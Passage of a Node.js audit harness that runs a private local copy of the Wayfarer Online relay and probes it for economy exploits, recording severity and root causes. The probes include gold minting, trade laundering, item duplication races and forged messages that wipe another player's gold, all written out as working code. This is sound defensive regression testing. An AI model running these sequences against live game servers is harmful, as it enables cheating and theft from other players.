#!/usr/bin/env node
// econ_audit_dupes.mjs — DUPLICATION / RACE exploit audit for the Wayfarer Online relay.
//
// Drives the REAL relay (server/index.js) with real colyseus.js clients (one room,
// several sockets) and inspects the REAL server-side character store (DATA_DIR/players)
// for the resulting state. Every probe asserts on state the SERVER persisted, not on
// what a client claims.
//
//   node tools/econ_audit_dupes.mjs                 # spawn its own relay on a free port
//   node tools/econ_audit_dupes.mjs --port 2718     # fixed port
//   node tools/econ_audit_dupes.mjs --keep          # do not delete the temp DATA_DIR
//   node tools/econ_audit_dupes.mjs --only gift-forged-item-mint
//
// Exits 0 when no critical/high probe fired, 1 when at least one did (regression gate),
// 2 on harness failure. Severities: critical > high > medium > low.
//
// Ownership: this file is self-contained; it never writes to the repo. All server data
// goes to a private temp DATA_DIR that is removed on exit unless --keep.

import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import crypto from 'node:crypto';
import { spawn } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { createRequire } from 'node:module';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.resolve(HERE, '..');
const SERVER = path.join(ROOT, 'server');
const argv = process.argv.slice(2);
const arg = (k, d) => { const i = argv.indexOf(k); return i >= 0 ? argv[i + 1] : d; };
const flag = (k) => argv.includes(k);

// colyseus.js lives in the repo root node_modules; ws is a server dependency.
const require_ = createRequire(path.join(ROOT, 'noop.js'));
const { Client } = require_('colyseus.js');
try { if (!globalThis.WebSocket) globalThis.WebSocket = require_('ws').WebSocket; } catch { /* node >=22 has a global */ }

const GEAR = JSON.parse(fs.readFileSync(path.join(SERVER, 'shared', 'item_ids.json'), 'utf8')).gear || {};
const GEAR_IDS = Object.keys(GEAR).filter((id) => GEAR[id] && typeof GEAR[id].slot === 'string');
if (GEAR_IDS.length < 3) { console.error('harness: item_ids.json needs >=3 slotted gear ids'); process.exit(2); }
const [GX, GY, GZ] = GEAR_IDS;                       // three distinct real gear ids
const slotOf = (id) => GEAR[id].slot;

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const tok = () => crypto.randomBytes(24).toString('base64url').slice(0, 32);
const nowIso = () => new Date().toISOString();

// ── server store access (authoritative) ────────────────────────────────
const sha = (s) => crypto.createHash('sha256').update(String(s)).digest('hex').slice(0, 32);
function charPath(dataDir, token) { return path.join(dataDir, 'players', `${sha(token)}.json`); }
function charRec(dataDir, token, name) {
  const f = charPath(dataDir, token);
  try { const d = JSON.parse(fs.readFileSync(f, 'utf8')); return d.chars[String(name).toLowerCase()] || null; } catch { return null; }
}
const countIn = (inv, equipped, id) =>
  (inv || []).filter((x) => x === id).length + Object.values(equipped || {}).filter((x) => x === id).length;
// live market board (econStore write-behind + commit() on every post/buy/cancel)
function marketListings(dataDir) {
  try { return JSON.parse(fs.readFileSync(path.join(dataDir, 'economy', 'market.json'), 'utf8')).listings || {}; } catch { return {}; }
}
// the store writes behind (SAVE_FLUSH_MS); poll until the disk shows what we expect
async function waitForStore(fn, ms = 2500, step = 100) {
  const t0 = Date.now();
  for (;;) { const v = fn(); if (v) return v; if (Date.now() - t0 > ms) return null; await sleep(step); }
}

// ── relay lifecycle ────────────────────────────────────────────────────
async function freePort(start, end) {
  const net = await import('node:net');
  for (let p = start; p <= end; p++) {
    const ok = await new Promise((res) => { const s = net.createServer(); s.once('error', () => res(false)); s.once('listening', () => s.close(() => res(true))); s.listen(p, '127.0.0.1'); });
    if (ok) return p;
  }
  throw new Error(`no free port in ${start}-${end}`);
}
class Relay {
  constructor(port, dataDir, child) { this.port = port; this.dataDir = dataDir; this.child = child; this.url = `http://127.0.0.1:${port}`; }
  static async start(dataDir, port) {
    const env = { ...process.env, PORT: String(port), DATA_DIR: dataDir, LOG_LEVEL: 'warn', SAVE_FLUSH_MS: '250' };
    const child = spawn(process.execPath, ['index.js'], { cwd: SERVER, env, stdio: 'ignore', windowsHide: true });
    const r = new Relay(port, dataDir, child);
    for (let i = 0; i < 120; i++) {
      if (child.exitCode !== null) throw new Error(`relay exited early (${child.exitCode})`);
      try { const h = await fetch(`${r.url}/health`); if (h.ok) return r; } catch { /* booting */ }
      await sleep(200);
    }
    throw new Error('relay did not become healthy');
  }
  async stop() { try { this.child.kill(); } catch { /* gone */ } await sleep(150); try { this.child.kill('SIGKILL'); } catch { /* gone */ } }
}

// ── client helper ──────────────────────────────────────────────────────
function mkProg({ gold = 0, inventory = [], equipped = {}, level = 1 } = {}) {
  return {
    job: 'wayfarer', level, xp: 0, xpNext: 100, gold, potions: 0, maxHp: 100, maxMp: 30, atk: 10,
    x: 0, y: 0, inventory: [...inventory], equipped: { ...equipped }, dyes: {},
    quest: { idx: 0, kills: {} }, savedAt: Date.now(),
  };
}
async function connect(relay, name, token) {
  const room = await new Client(relay.url).joinOrCreate('world', { name, token, hero: {}, x: 0, y: 0 });
  const inbox = [];
  const c = {
    room, name, token, sid: room.sessionId, inbox,
    send: (t, m) => room.send(t, m),
    // peer-broadcasts carry sessionId; relayed server messages do not
    got: (t, pred) => inbox.filter((e) => e.t === t && (!pred || pred(e.m))),
    set rev(v) { c._rev = v; }, get rev() { return c._rev ?? 0; },
    save: (progress, rev) => room.send('save', { name, progress, hero: {}, rev: rev ?? c.rev }),
    async wait(t, pred, ms = 2500) {
      const t0 = Date.now();
      for (;;) {
        const hit = c.got(t, pred).slice(-1)[0];
        if (hit) return hit.m;
        if (Date.now() - t0 > ms) return null;
        await sleep(25);
      }
    },
    leave: async () => { try { await room.leave(true); } catch { /* gone */ } },
  };
  c._rev = 0;
  c.drain = () => { inbox.length = 0; };
  room.onMessage('*', (t, m) => {
    inbox.push({ t, m, at: Date.now() });
    // every economy result carries the authoritative rev: track it like the real client does
    if (m && typeof m === 'object' && typeof m.rev === 'number' && (t === 'econ-sync' || t === 'trade-result' || t === 'econ-state')) c._rev = m.rev;
    if (t === 'saved') c._saved = m;
  });
  return c;
}
const anyOf = (arr, t) => arr.some((e) => e.t === t);
// compact inbox trace for failure evidence
const trace = (c, n = 14) => JSON.stringify(c.inbox.slice(-n).map((e) => ({ t: e.t, m: e.m })));

// ── probes ─────────────────────────────────────────────────────────────
const RESULTS = [];
let HARNESS_FAIL = null;

/** P_A (CRITICAL): a brand-new character's FIRST save has no server copy to compare
 *  against, so validate.js's clamp block is skipped entirely (validate.js:60 `if (pp)`).
 *  A throwaway token can mint GOLD_MAX gold + a full bag, and the server-authoritative
 *  trade — which mutates the record directly and never runs validateSave — launders it
 *  onto a real character. "Earn second" is bypassed completely. */
async function p_freshSaveGoldMint(ctx) {
  const { relay, dataDir } = ctx;
  const tA = tok(); const tB = tok();
  const A = await connect(relay, 'Throwaway', tA);
  const B = await connect(relay, 'Main', tB);
  B.save(mkProg({ gold: 0, inventory: [] }));
  await sleep(500);
  A.save(mkProg({ gold: 9_999_999, inventory: [GX, GY, GZ] }));   // first-ever save for this token
  const minted = await waitForStore(() => { const r = charRec(dataDir, tA, 'Throwaway'); return r && r.progress.gold === 9_999_999 ? r : null; });
  const clampNote = A.got('saved').slice(-1)[0]?.m ?? null;
  A.drain(); B.drain();
  let rA = null; let rB = null; let bAfter = null; let bFinal = null; let savedB = null;
  if (minted) {
    A.rev = minted.rev || 0; B.rev = charRec(dataDir, tB, 'Main')?.rev || 0;
    A.send('trade-request', { to: B.sid });
    const req = await B.wait('trade-request', (m) => m.from === A.sid);
    if (req) {
      B.send('trade-respond', { from: A.sid, accept: true });
      const open = await A.wait('trade-open');
      if (open) {
        A.send('trade-offer', { id: open.id, items: [GX], gold: 1_000_000 });
        B.send('trade-offer', { id: open.id, items: [], gold: 0 });
        await sleep(150);
        A.send('trade-lock', { id: open.id, rev: A.rev }); B.send('trade-lock', { id: open.id, rev: B.rev });
        await sleep(150);
        A.send('trade-confirm', { id: open.id }); B.send('trade-confirm', { id: open.id });
        rA = await A.wait('trade-result', (m) => m.id === open.id);
        rB = await B.wait('trade-result', (m) => m.id === open.id);
        bAfter = await waitForStore(() => { const r = charRec(dataDir, tB, 'Main'); return r && r.progress.gold === 1_000_000 ? r : null; });
        B.drain();
        B.save(mkProg({ gold: 1_000_000, inventory: [GX] }), rB?.rev ?? 0);
        savedB = await B.wait('saved', null, 1500);
        bFinal = await waitForStore(() => { const r = charRec(dataDir, tB, 'Main'); return r && r.progress.gold === 1_000_000 ? r : null; }, 1200);
      }
    }
  }
  const exploited = !!(minted && clampNote && clampNote.clamped === null && rA?.ok && rB?.ok && bAfter && bFinal?.progress?.gold === 1_000_000);
  await A.leave(); await B.leave();
  return {
    exploited, severity: 'critical',
    title: 'First save of a fresh token is unclamped -> mint GOLD_MAX, launder it through the real trade',
    rootCause: 'server/validate.js:59-66 (the level/gold clamp only runs when a previous server record exists) + server/economy.js:624 mutate() writes the record directly, never through validateSave',
    detail: exploited
      ? `A throwaway character stored 9,999,999 gold and 3 items on its first save (clamped=null); it then handed 1,000,000g + ${GX} to a normal character through the server-checked trade, and that character's own save kept the laundered gold.`
      : 'not reproduced',
    evidence: [
      `fresh-token save accepted: clamped=${JSON.stringify(clampNote?.clamped ?? null)}, stored gold=${minted?.progress?.gold}`,
      `stored bag: ${JSON.stringify(minted?.progress?.inventory ?? null)} (validate.js:34 caps at 40 and never applies isGearId)`,
      `trade-results: A=${JSON.stringify(rA && { ok: rA.ok, gold: rA.gold })} B=${JSON.stringify(rB && { ok: rB.ok, gold: rB.gold })}`,
      `recipient server copy after the trade: gold=${bAfter?.progress?.gold} inventory=${JSON.stringify(bAfter?.progress?.inventory ?? null)}`,
      `recipient's own follow-up save kept it: saved=${JSON.stringify(savedB)} -> gold=${bFinal?.progress?.gold}`,
      `A inbox: ${trace(A)}`,
      `B inbox: ${trace(B)}`,
      'the recipient never earned any of it: it is unbounded, repeatable with a new token per mint',
    ],
  };
}

/** P_B (MEDIUM, NOT an exploit — reported because the owner's trust model depends on it):
 *  the /gift quick-gift path is DEAD. colyseus keeps one handler per message type
 *  (@colyseus/core Room.js:468 assigns, it does not append), so server/economy.js:258/242
 *  overwrite server/social.js:233/244 for 'trade-offer'/'trade-respond'. The social relay
 *  code at social.js:232-255 can therefore never run while economy.js is loaded: a
 *  /gift offer is answered with econ-error and the recipient is never told.
 *  NOT exploitable today — but the trust-based relay is one `git revert` away from being live. */
async function p_giftInert(ctx) {
  const { relay } = ctx;
  const tA = tok(); const tB = tok();
  const A = await connect(relay, 'GiftA', tA);
  const B = await connect(relay, 'GiftB', tB);
  A.save(mkProg({ gold: 1000, inventory: [GX] })); B.save(mkProg({ gold: 0, inventory: [] }));
  await sleep(600);
  A.drain(); B.drain();
  // exactly what src/systems/social/index.js:331 offerTrade() puts on the wire for /gift
  A.send('trade-offer', { to: B.sid, gold: 1000, item: GX });
  await sleep(800);
  const bGot = B.got('trade-offer');
  const aErr = A.got('econ-error').slice(-1)[0]?.m ?? null;
  const aSent = A.got('trade-sent');
  const inert = bGot.length === 0 && !!aErr && aSent.length === 0;
  await A.leave(); await B.leave();
  return {
    exploited: false, severity: 'medium',
    title: '/gift quick-gift is dead code: economy.js shadows the social.js relay handler',
    rootCause: 'server/economy.js:258 (trade-offer) + :242 (trade-respond) overwrite server/social.js:233/244 — colyseus onMessage keeps ONE handler per type (@colyseus/core/build/Room.js:468); the trust-model relay at server/social.js:232-255 is unreachable',
    detail: inert
      ? 'A /gift offer reached nobody: the recipient got no trade-offer, the sender got no trade-sent, and the economy answered econ-error "That trade is closed." (it expects {id,items,gold}, not {to,gold,item}).'
      : 'unexpected: the social relay answered',
    evidence: [
      `recipient inbox trade-offer count: ${bGot.length} (expected 0)`,
      `sender received: ${JSON.stringify(aErr)}`,
      `sender trade-sent count: ${aSent.length}`,
      'the same shadowing kills social.js guild-create/guild-join/guild-leave (economy.js:450/464/493)',
      'consequence: if economy.js is ever unloaded/disabled, the relay becomes live with no ownership check and no server-side swap (see the diff in docs/audit/dupes.md)',
    ],
  };
}

/** P_E (HIGH): the gold clamp is RELATIVE to the last accepted server value
 *  (`prev.gold + CAPS.goldBase + dt*CAPS.goldPerSec`, validate.js:64), so saving the same
 *  character repeatedly inflates its gold with no gameplay at all. Nothing bounds the
 *  total; the save bucket (0.5/s) only paces it. Laundering then works exactly like P_A. */
async function p_goldRateFarm(ctx) {
  const { relay, dataDir } = ctx;
  const tA = tok();
  const A = await connect(relay, 'Farmer', tA);
  A.save(mkProg({ gold: 0, inventory: [] }));
  await waitForStore(() => { const r = charRec(dataDir, tA, 'Farmer'); return r && r.progress.gold === 0 ? r : null; });
  const gains = []; let accepted = 0; let savedMsgs = 0;
  const seeded = charRec(dataDir, tA, 'Farmer')?.progress?.gold ?? 0;
  for (let i = 0; i < 8; i++) {
    const cur = charRec(dataDir, tA, 'Farmer');
    const g = cur.progress.gold | 0;
    const want = g + 1500 + 120;          // goldBase + ~2s of goldPerSec: inside the clamp at dt>=2s
    A.drain();
    A.save(mkProg({ gold: want, inventory: [] }), cur.rev || 0);
    await A.wait('saved', null, 2000);
    savedMsgs += A.got('saved').length;
    await sleep(420);                     // let the store's 250ms write-behind reach disk
    const now = charRec(dataDir, tA, 'Farmer')?.progress?.gold ?? g;
    if (now > g) { accepted++; gains.push(now - g); }
    await sleep(2600);                    // spread the saves so the economy rate buckets refill
  }
  const final = charRec(dataDir, tA, 'Farmer')?.progress?.gold ?? 0;
  const exploited = accepted >= 5 && final >= 7000;
  await A.leave();
  return {
    exploited, severity: 'high',
    title: 'AFK save loop farms gold: the clamp is relative, so every save raises the ceiling',
    rootCause: 'server/validate.js:64 (maxGold = prev.gold + goldBase + dt*goldPerSec — no absolute or lifetime cap; validate.js:17-21)',
    detail: exploited
      ? `An idle character with no gameplay gained ${accepted} accepted +gold saves (${final} gold total, net +${final}) purely by re-uploading a save every ~2.6s.`
      : 'not reproduced',
    evidence: [
      `rounds that raised the stored gold: ${accepted}/8, gains per save: ${JSON.stringify(gains)}`,
      `final server-side gold: ${final} (seeded at ${seeded}); 'saved' acks seen: ${savedMsgs}`,
      'the same primitive works on a fresh token (P_A) and launders through the server trade, so the economy has no gold floor at all',
    ],
  };
}

/** P_C (verification of the fix shape): the economy's trade-respond IS gated on a
 *  pending request, so the social.js forgery primitive (accept a trade nobody offered)
 *  does not exist on the live path. Recorded as blocked so a future regression is caught. */
async function p_forgedTradeRespond(ctx) {
  const { relay } = ctx;
  const tA = tok(); const tB = tok();
  const A = await connect(relay, 'FakeA', tA);
  const B = await connect(relay, 'FakeB', tB);
  A.save(mkProg({ gold: 0, inventory: [] })); B.save(mkProg({ gold: 5000, inventory: [GX] }));
  await sleep(600);
  B.drain(); A.drain();
  B.send('trade-respond', { from: A.sid, accept: true });     // no trade-request was ever sent
  await sleep(700);
  const opens = B.got('trade-open');
  const errs = B.got('econ-error');
  const delivered = A.got('trade-open');
  const blocked = opens.length === 0 && delivered.length === 0 && errs.some((e) => /expired/i.test(e.m?.msg || ''));
  await A.leave(); await B.leave();
  return {
    exploited: false, severity: 'low',
    title: 'Forged trade-respond with no pending request (economy path)',
    rootCause: 'server/economy.js:242-249 (REQUESTS.set at :238, one-shot .get/.delete at :244-245)',
    detail: blocked ? 'Rejected: the forged accept was answered with "That trade request has expired." and no session was created for either side.' : 'UNEXPECTED: a session was created',
    evidence: [
      `trade-open received by either side: ${opens.length + delivered.length} (expected 0)`,
      `response: ${JSON.stringify(errs.slice(-1)[0]?.m ?? null)}`,
      'contrast: server/social.js:244-255 has no such gate (it cannot run today — see the gift-path probe)',
    ],
  };
}

/** P_D (CRITICAL): WayfarerRoom registers a catch-all '*' handler; colyseus only falls
 *  through to it when NO specific handler exists for the type
 *  (@colyseus/core/build/Room.js:752). Any server->client type that no module registers
 *  can therefore be forged by any client and broadcast to every peer. `trade-done` is
 *  such a type (server/social.js only ever SENDS it: :251/:253) — and its client sink
 *  (src/net/socialNet.js:25 -> src/systems/social/index.js:365 onTradeDone) does not check
 *  the sender, does not check that a trade exists, and persists the result via saveNow(). */
async function p_wildcardForge(ctx) {
  const { relay, dataDir } = ctx;
  const tC = tok(); const tV = tok();
  const C = await connect(relay, 'Forger', tC);
  const V = await connect(relay, 'Bystander', tV);
  V.save(mkProg({ gold: 5000, inventory: [GX] }));
  await waitForStore(() => { const r = charRec(dataDir, tV, 'Bystander'); return r && r.progress.gold === 5000 ? r : null; });
  V.drain(); C.drain();
  C.send('trade-done', { gold: 999_999, item: GX });            // unregistered -> '*' passthrough
  C.send('duel-start', { a: C.sid, b: V.sid });                 // unregistered -> '*' passthrough
  C.send('party-update', { id: 'p1', leader: C.sid, members: [{ id: V.sid, name: 'Bystander' }] });
  C.send('econ-sync', { why: 'forged', rev: 99, gold: 0, inventory: [] }); // REGISTERED (economy.js:215)
  const gotDone = await V.wait('trade-done');
  const gotDuel = await V.wait('duel-start');
  const gotParty = await V.wait('party-update');
  const gotSync = await V.wait('econ-sync', null, 900);
  const gotPvp = await (async () => { C.send('pvp-hit', { from: 'X', dmg: 500 }); return V.wait('pvp-hit', null, 700); })();
  // the victim's client applies onTradeDone + saveNow() (src/systems/social/index.js:365-385)
  if (gotDone) V.save(mkProg({ gold: Math.max(0, 5000 - (gotDone.gold | 0)), inventory: [] }), V.rev);
  const vAfter = await waitForStore(() => { const r = charRec(dataDir, tV, 'Bystander'); return r && r.progress.gold === 0 ? r : null; }, 2500);
  const exploited = !!gotDone && !!vAfter && vAfter.progress.gold === 0;
  await C.leave(); await V.leave();
  return {
    exploited, severity: 'critical',
    title: 'Any client can forge server->client messages to every peer via the "*" passthrough (trade-done zeroes other players\' gold)',
    rootCause: 'server/WayfarerRoom.js:121-131 (catch-all broadcast of unknown client types) + server/economy.js:215-217 (the "swallow" list is incomplete: trade-done is not in it, and a no-op listener is the ONLY thing that can suppress a type) + src/net/socialNet.js:23-30 (no m.sessionId guard, unlike src/net/economyNet.js:74)',
    detail: exploited
      ? `One forged trade-done was delivered to a third-party client (stamped sessionId=${C.sid}); the client-side sink zeroes gold and removes the named item, the resulting save was accepted, and 5000g + ${GX} are gone from the server copy. No trade ever existed.`
      : 'not reproduced',
    evidence: [
      `peer received forged trade-done: ${JSON.stringify(gotDone)}`,
      `peer received forged duel-start: ${JSON.stringify(gotDuel)}`,
      `peer received forged party-update: ${JSON.stringify(gotParty)}`,
      `peer received forged econ-sync (a REGISTERED type): ${JSON.stringify(gotSync)} — null, i.e. the economy.js:215 swallow correctly stops this one`,
      `peer received forged pvp-hit: ${JSON.stringify(gotPvp)} — null, pvp-hit is registered by social.js:288 so '*' does not fire (third-party duel damage is NOT forgeable)`,
      `victim server copy after the client persisted it: gold=${vAfter?.progress?.gold} inventory=${JSON.stringify(vAfter?.progress?.inventory ?? null)}`,
      'unregistered-but-consumed types include trade-done, duel-start, party-update, trade-sent, whisper-sent, presence-gone (socialNet.js:23-36)',
    ],
  };
}

/** P5: beat the econOut dupe guard by re-uploading the traded item in the equipped map. */
async function p_econOutEquippedBypass(ctx) {
  const { relay, dataDir } = ctx;
  const tA = tok(); const tB = tok();
  const A = await connect(relay, 'OutA', tA);
  const B = await connect(relay, 'OutB', tB);
  A.save(mkProg({ gold: 100, inventory: [GX] }));
  B.save(mkProg({ gold: 1000, inventory: [] }));
  await sleep(600);
  A.drain(); B.drain();
  // ── authoritative (server-checked) trade: A gives GX, B gives 50 gold
  A.send('trade-request', { to: B.sid });
  const req = await B.wait('trade-request', (m) => m.from === A.sid);
  B.send('trade-respond', { from: A.sid, accept: true });
  const open = await A.wait('trade-open');
  if (!open) return { exploited: false, severity: 'high', title: 'econOut equipped-slot bypass', detail: 'setup failed: no trade-open', rootCause: 'server/economy.js:180-193', evidence: [JSON.stringify(req)] };
  const id = open.id;
  A.send('trade-offer', { id, items: [GX], gold: 0 });
  B.send('trade-offer', { id, items: [], gold: 50 });
  await sleep(150);
  A.send('trade-lock', { id, rev: A.rev });
  B.send('trade-lock', { id, rev: B.rev });
  await sleep(150);
  A.send('trade-confirm', { id });
  B.send('trade-confirm', { id });
  const resA = await A.wait('trade-result', (m) => m.id === id);
  const resB = await B.wait('trade-result', (m) => m.id === id);
  const okTrade = !!(resA?.ok && resB?.ok);
  const revA = resA?.rev ?? 0;
  const aTraded = charRec(dataDir, tA, 'OutA');
  const aGone = countIn(aTraded?.progress?.inventory, aTraded?.progress?.equipped, GX) === 0;
  const outEntries = (aTraded?.econOut || []).map((e) => e.id);
  A.drain();
  // ── re-upload the traded item inside the equipped map, quoting the current rev
  A.save(mkProg({ gold: (aTraded?.progress?.gold ?? 0), inventory: [], equipped: { [slotOf(GX)]: GX } }), revA);
  const stale = await A.wait('econ-sync', (m) => m.stale === 1, 1200);
  const aBack = await waitForStore(() => { const r = charRec(dataDir, tA, 'OutA'); return r && countIn(r.progress.inventory, r.progress.equipped, GX) === 1 ? r : null; }, 2000);
  const bRec = charRec(dataDir, tB, 'OutB');
  const total = countIn(aBack?.progress?.inventory, aBack?.progress?.equipped, GX) + countIn(bRec?.progress?.inventory, bRec?.progress?.equipped, GX);
  const exploited = okTrade && aGone && !stale && total === 2;
  await A.leave(); await B.leave();
  return {
    exploited, severity: 'high',
    title: 'econOut dupe guard defeated by re-uploading the traded item in the equipped map',
    rootCause: 'server/economy.js:186-190 (strips only from progress.inventory; when the extra copy sits in equipped, lastIndexOf returns -1, the loop breaks and nothing is stripped or reported)',
    detail: exploited
      ? `A traded ${GX} away (server removed it, econOut recorded), then re-uploaded it as equipped.{${slotOf(GX)}} with rev=${revA}; the save was accepted and ${total} copies of ${GX} now exist server-side.`
      : 'not reproduced',
    evidence: [
      `trade-result A: ${JSON.stringify(resA)}`,
      `A server copy right after the trade: inventory=${JSON.stringify(aTraded?.progress?.inventory ?? null)} equipped=${JSON.stringify(aTraded?.progress?.equipped ?? null)} econOut=${JSON.stringify(outEntries)}`,
      `A server copy after the re-upload: inventory=${JSON.stringify(aBack?.progress?.inventory ?? null)} equipped=${JSON.stringify(aBack?.progress?.equipped ?? null)}`,
      `stale/econ-sync refusal on that save: ${JSON.stringify(stale)} (null = the save was accepted)`,
      `total ${GX} across A+B server copies: ${total}`,
    ],
  };
}

/** P6: saves are not filtered by the tradable whitelist -> minted items convert to gold. */
async function p_saveItemMint(ctx) {
  const { relay, dataDir } = ctx;
  const tA = tok(); const tB = tok();
  const A = await connect(relay, 'SaveA', tA);
  const B = await connect(relay, 'SaveB', tB);
  const minted = [GX, GY, GZ, GX, GY];
  A.save(mkProg({ gold: 200, inventory: minted }));   // a brand-new character "holding" 5 items
  B.save(mkProg({ gold: 1000, inventory: [] }));
  const stored = await waitForStore(() => { const r = charRec(dataDir, tA, 'SaveA'); return r && r.progress.inventory.length === minted.length ? r : null; });
  const clampNote = A.got('saved').slice(-1)[0]?.m ?? null;
  A.drain(); B.drain();
  let listed = null; let sold = null; let mail = null; let lot = null;
  if (stored) {
    A.send('market-post', { item: GX, price: 100, hours: 2, rev: A.rev });
    listed = await A.wait('econ-msg', null, 2000);
    const page = await (async () => { B.room.send('market-browse', { q: '', page: 0 }); return B.wait('market-page', null, 2000); })();
    lot = page?.items?.find((i) => i.item === GX && i.seller === 'SaveA') || null;
    if (lot) {
      B.send('market-buy', { id: lot.id, rev: B.rev });
      sold = await B.wait('econ-msg', null, 2000);
      A.room.send('mail-list', {});
      mail = await A.wait('mail-box', (m) => (m.mails || []).some((x) => x.gold > 0), 2500);
    }
  }
  const aAfter = charRec(dataDir, tA, 'SaveA');
  const bAfter = charRec(dataDir, tB, 'SaveB');
  const soldOk = !!(sold && /Bought/.test(sold.text));
  const exploited = !!(stored && lot && soldOk && mail);
  const aGold = aAfter?.progress?.gold ?? -1;
  await A.leave(); await B.leave();
  return {
    exploited, severity: 'high',
    title: 'Save upload accepts arbitrary gear ids (no whitelist) -> items minted and sold for gold',
    rootCause: 'server/validate.js:34 (inventory filtered by length only; isGearId is never applied to saves) + server/economy.js:341 (hasItems trusts that server copy)',
    detail: exploited
      ? `A fresh character uploaded ${minted.length} items it never earned, the server stored them, market-post accepted one (server-side ownership check passed), B bought it for 100g and A was paid. Minted items converted into real gold.`
      : 'not reproduced',
    evidence: [
      `server copy after the mint save: ${JSON.stringify(aAfter?.progress?.inventory ?? null)} (clamped=${JSON.stringify(clampNote)})`,
      `A market-post result: ${JSON.stringify(listed)}`,
      `B market-buy result: ${JSON.stringify(sold)}`,
      `A mailbox with gold attachment: ${JSON.stringify(mail?.mails?.find((x) => x.gold > 0) ?? null)}`,
      `A server copy afterwards: gold=${aGold} inventory=${JSON.stringify(aAfter?.progress?.inventory ?? null)}; B: gold=${bAfter?.progress?.gold} inventory=${JSON.stringify(bAfter?.progress?.inventory ?? null)}`,
    ],
  };
}

/** P7: the save cap (40) exceeds ECON.BAG_SIZE (30) -> server/client disagree on the bag. */
async function p_bagOverflow(ctx) {
  const { relay, dataDir } = ctx;
  const tA = tok();
  const A = await connect(relay, 'Bag40', tA);
  const fill = Array.from({ length: 40 }, (_, i) => GEAR_IDS[i % GEAR_IDS.length]);
  A.save(mkProg({ gold: 0, inventory: fill }));
  const stored = await waitForStore(() => { const r = charRec(dataDir, tA, 'Bag40'); return r && r.progress.inventory.length > 30 ? r : null; });
  A.room.send('econ-hello', { rev: A.rev });
  const state = await A.wait('econ-state', null, 1500);
  const serverLen = stored?.progress?.inventory?.length ?? 0;
  const exploited = serverLen > 30;
  await A.leave();
  return {
    exploited, severity: 'low',
    title: 'Backpack overflow: the server keeps 40 items while the client bag is 30',
    rootCause: 'server/validate.js:34 (slice(0,40)) vs server/validate.js:84 ECON.BAG_SIZE=30 + src/net/economyNet.js:150 (replaceFrom slices to BAG_SIZE)',
    detail: exploited
      ? `The server stored ${serverLen} items; econ-state reports ${state?.inventory?.length ?? '?'} and the client keeps only the first 30, so up to 10 items are held but unreachable, and trade/mail 'bag full' checks fire inconsistently.`
      : 'not reproduced',
    evidence: [`server inventory length: ${serverLen}`, `econ-state inventory length: ${state?.inventory?.length ?? null}`, `ECON.BAG_SIZE=30 (server/validate.js:84), client BAG_SIZE=30 (src/core/save.js:9)`],
  };
}

// ── races (the server-authoritative trade path) ─────────────────────────
/** R1: two sockets (two tabs) racing ONE character that holds exactly ONE copy of GX.
 *  Both tabs offer that same single copy to different partners. At most one trade may
 *  settle; if both do, two partners hold a copy of an item the character only ever had
 *  one of. A fresh set of clients each round keeps every rate bucket full. */
async function raceTwoTabs(ctx, N) {
  const { relay, dataDir } = ctx;
  let rounds = 0; let doubles = 0; const notes = [];
  for (let i = 0; i < N; i++) {
    const tX = tok(); const tT = tok(); const tU = tok();
    const X1 = await connect(relay, 'TabX', tX);
    const X2 = await connect(relay, 'TabX', tX);        // same device token + name = same server char
    const T = await connect(relay, 'PartnerT', tT);
    const U = await connect(relay, 'PartnerU', tU);
    const SEED = 1;
    X1.save(mkProg({ gold: 0, inventory: Array(SEED).fill(GX) }));
    T.save(mkProg({ gold: 900, inventory: [] })); U.save(mkProg({ gold: 900, inventory: [] }));
    await sleep(220);
    try {
      X1.send('trade-request', { to: T.sid });
      X2.send('trade-request', { to: U.sid });
      await sleep(140);
      T.send('trade-respond', { from: X1.sid, accept: true });
      U.send('trade-respond', { from: X2.sid, accept: true });
      const o1 = await X1.wait('trade-open', null, 1200);
      const o2 = await X2.wait('trade-open', null, 1200);
      if (!o1 || !o2) { notes.push(`round ${i}: no trade-open`); continue; }
      void T.wait('trade-open', null, 300); void U.wait('trade-open', null, 300);
      X1.send('trade-offer', { id: o1.id, items: [GX], gold: 0 });
      X2.send('trade-offer', { id: o2.id, items: [GX], gold: 0 });
      T.send('trade-offer', { id: o1.id, items: [], gold: 100 });
      U.send('trade-offer', { id: o2.id, items: [], gold: 100 });
      await sleep(160);
      X1.send('trade-lock', { id: o1.id, rev: X1.rev }); X2.send('trade-lock', { id: o2.id, rev: X2.rev });
      T.send('trade-lock', { id: o1.id, rev: T.rev }); U.send('trade-lock', { id: o2.id, rev: U.rev });
      await sleep(160);
      // same tick: both tabs confirm the SAME single copy
      X1.send('trade-confirm', { id: o1.id });
      X2.send('trade-confirm', { id: o2.id });
      T.send('trade-confirm', { id: o1.id });
      U.send('trade-confirm', { id: o2.id });
      const r1 = await X1.wait('trade-result', (m) => m.id === o1.id, 1800);
      const r2 = await X2.wait('trade-result', (m) => m.id === o2.id, 1800);
      const ok1 = r1?.ok ? 1 : 0; const ok2 = r2?.ok ? 1 : 0;
      await sleep(300);                  // let the store flush before counting
      const copies = countIn(charRec(dataDir, tX, 'TabX')?.progress?.inventory, null, GX)
        + countIn(charRec(dataDir, tT, 'PartnerT')?.progress?.inventory, null, GX)
        + countIn(charRec(dataDir, tU, 'PartnerU')?.progress?.inventory, null, GX);
      rounds++;
      if (copies !== SEED) { doubles++; notes.push(`round ${i}: ${copies} copies of ${GX} alive from 1 (ok1=${ok1} ok2=${ok2})`); }
      else if (ok1 && ok2) notes.push(`round ${i}: both reports said ok but ${copies} copy alive (harmless double-ack)`);
    } finally { await Promise.all([X1.leave(), X2.leave(), T.leave(), U.leave()]); }
  }
  return {
    exploited: doubles > 0, inconclusive: rounds === 0, severity: 'critical',
    title: 'Two tabs on one character: one locked single-copy offer confirmed by both tabs',
    rootCause: 'server/economy.js:612 (executeTrade compares lockRev) — one character can hold two sessions because tradeOf (server/economy.js:563) is per-session',
    detail: `${doubles} duplicated rounds out of ${rounds} raced (${N} attempted); invariant: 1 copy of ${GX} in the world`,
    evidence: [`attempts=${N} raced=${rounds} duplicated=${doubles}`, ...notes.slice(0, 5), 'each round used a fresh character holding exactly 1 copy, so any count above 1 is a genuine duplication'],
  };
}

/** R2: duplicate trade-confirm in the same tick for one session. */
async function raceDoubleConfirm(ctx, N) {
  const { relay, dataDir } = ctx;
  const tA = tok(); const tB = tok();
